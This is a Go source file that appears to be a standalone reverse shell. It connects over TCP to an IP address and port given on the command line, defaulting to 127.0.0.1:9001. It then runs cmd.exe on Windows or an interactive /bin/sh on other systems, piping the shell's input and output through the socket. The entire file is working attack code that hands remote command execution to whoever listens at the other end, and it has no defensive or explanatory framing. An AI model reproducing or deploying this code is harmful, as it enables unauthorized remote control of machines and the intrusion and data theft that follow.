package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
)

func shell(c net.Conn, wg *sync.WaitGroup) {
	fmt.Println("Creating Shell")

	defer wg.Done()

	getShell()(c)
}

func getShell() func(net.Conn) {
	if runtime.GOOS == "windows" {
		return _shellWindows
	}
	return _shellLinux
}

func _shellWindows(conn net.Conn) {
	c := exec.Command("cmd.exe")
	rp, wp := io.Pipe()
	c.Stdin = conn
	c.Stdout = wp
	go io.Copy(conn, rp)
	c.Stderr = conn
	c.Run()
	conn.Close()
}

func _shellLinux(conn net.Conn) {
	c := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	c.Stdin = conn
	c.Stdout = wp
	go io.Copy(conn, rp)
	c.Stderr = conn
	c.Run()
	conn.Close()
}

func reverseShell(ip string, port string, wg *sync.WaitGroup) {
	defer wg.Done()

	c, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		return
	}
	wg.Add(1)
	go shell(c, wg)
}

func main() {
	var wg sync.WaitGroup

	// Set default values
	Addr := "127.0.0.1"
	Port := "9001"

	// Check if IP address provided as argument
	if len(os.Args) >= 2 {
		Addr = os.Args[1]
	}

	// Check if port provided as argument
	if len(os.Args) >= 3 {
		Port = os.Args[2]
	}

	wg.Add(1)
	go reverseShell(Addr, Port, &wg)

	wg.Wait()
}
